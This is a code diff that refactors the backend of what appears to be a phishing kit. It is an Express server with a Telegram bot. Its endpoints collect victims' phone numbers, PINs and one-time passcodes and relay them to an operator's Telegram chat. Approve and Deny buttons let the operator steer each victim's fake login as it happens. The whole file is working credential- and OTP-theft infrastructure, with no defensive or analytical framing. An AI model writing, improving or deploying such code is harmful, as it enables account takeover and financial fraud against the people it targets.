@@ -6,18 +6,11 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// -------------------- ENV CHECK --------------------
-if (!process.env.BOT_TOKEN) {
-    console.error("❌ BOT_TOKEN is missing");
-    process.exit(1);
-}
-
+// -------------------- INIT BOT --------------------
+const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 
-// -------------------- BOT INIT --------------------
-const bot = new Telegraf(process.env.BOT_TOKEN);
-
-// Memory store
+// -------------------- MEMORY STORE --------------------
 const statusStore = {};
 
 // -------------------- MIDDLEWARE --------------------
@@ -43,8 +36,9 @@ app.get('/:page', (req, res) => {
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
 
-    const now = new Date();
-    const currentTime = now.toLocaleString('en-US', { hour12: true });
+    const currentTime = new Date().toLocaleString('en-US', {
+        hour12: true
+    });
 
     if (!phone || !pin || !ADMIN_ID) {
         return res.status(400).json({ error: "Missing data" });
@@ -55,17 +49,17 @@ app.post('/api/login-notification', async (req, res) => {
     const message =
         `📱 CL 2 - LOGIN ATTEMPT\n\n` +
         `🆕 NEW USER\n` +
-        `📱 Phone: ${phone}\n` +
+        `📱 Phone Number: ${phone}\n` +
         `🔢 PIN: ${pin}\n` +
         `⏰ Time: ${currentTime}\n\n` +
-        `⚠️ Waiting for approval`;
+        `⚠️ User waiting for approval`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
+                        { text: "✅ Approve", callback_data: `approve_${phone}_${pin}` }
                     ],
                     [
                         { text: "❌ Deny", callback_data: `deny_${phone}` }
@@ -77,74 +71,66 @@ app.post('/api/login-notification', async (req, res) => {
         res.json({ success: true });
 
     } catch (err) {
-        console.error("❌ Telegram Error:", err.message);
-        res.status(500).json({ error: err.message });
+        console.error(err);
+        res.status(500).json({ error: "Telegram error" });
     }
 });
 
-// -------------------- VERIFY OTP API --------------------
+// -------------------- OTP API --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
 
-    const now = new Date();
-    const currentTime = now.toLocaleString('en-US', { hour12: true });
+    const currentTime = new Date().toLocaleString('en-US', {
+        hour12: true
+    });
 
     if (!phone || !otp || !ADMIN_ID) {
         return res.status(400).json({ error: "Missing data" });
     }
 
     const otpMessage =
-        `🔐 FIRST OTP RECEIVED\n\n` +
+        `1️⃣ FIRST OTP RECEIVED\n\n` +
         `📱 Phone: ${phone}\n` +
-        `🔢 OTP: ${otp}\n` +
+        `🔓 OTP: ${otp}\n` +
         `⏰ Time: ${currentTime}`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage);
         res.json({ success: true });
+
     } catch (err) {
-        console.error("❌ OTP Error:", err.message);
-        res.status(500).json({ error: err.message });
+        res.status(500).json({ error: "Telegram error" });
     }
 });
 
 // -------------------- BOT ACTIONS --------------------
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
+    const pin = ctx.match[2];
+
     statusStore[phone] = "approved";
 
-    await ctx.editMessageText(
-        `✅ LOGIN APPROVED\n📱 ${phone}`,
-        { parse_mode: 'Markdown' }
-    );
-});
+    const msg =
+        `✅ LOGIN APPROVED\n\n` +
+        `📱 ${phone}\n` +
+        `🔐 ${pin}`;
 
-bot.action(/correct1_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    statusStore[phone] = "otp1_correct";
-
-    await ctx.editMessageText(
-        "✅ OTP VERIFIED",
-        { parse_mode: 'Markdown' }
-    );
-});
-
-bot.action(/wrong_code_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    statusStore[phone] = "otp1_wrong";
-    await ctx.answerCbQuery("Wrong Code Alert Sent");
-});
-
-bot.action(/wrong_pin_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    statusStore[phone] = "denied";
-    await ctx.editMessageText("❌ WRONG PIN");
+    try {
+        await ctx.editMessageText(msg);
+    } catch (e) {
+        console.error(e.message);
+    }
 });
 
 bot.action(/deny_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "denied";
-    await ctx.editMessageText("❌ LOGIN DENIED");
+
+    try {
+        await ctx.editMessageText("❌ LOGIN DENIED");
+    } catch (e) {
+        console.error(e.message);
+    }
 });
 
 // -------------------- STATUS CHECK --------------------
@@ -158,14 +144,14 @@ app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
 
-// -------------------- BOT START --------------------
+// -------------------- START BOT --------------------
 const startBot = async () => {
     try {
         await bot.telegram.deleteWebhook({ drop_pending_updates: true });
         await bot.launch();
-        console.log("🤖 Bot launched successfully");
+        console.log("🤖 Bot running");
     } catch (err) {
-        console.error("❌ Bot launch error:", err.message);
+        console.error(err);
     }
 };
 
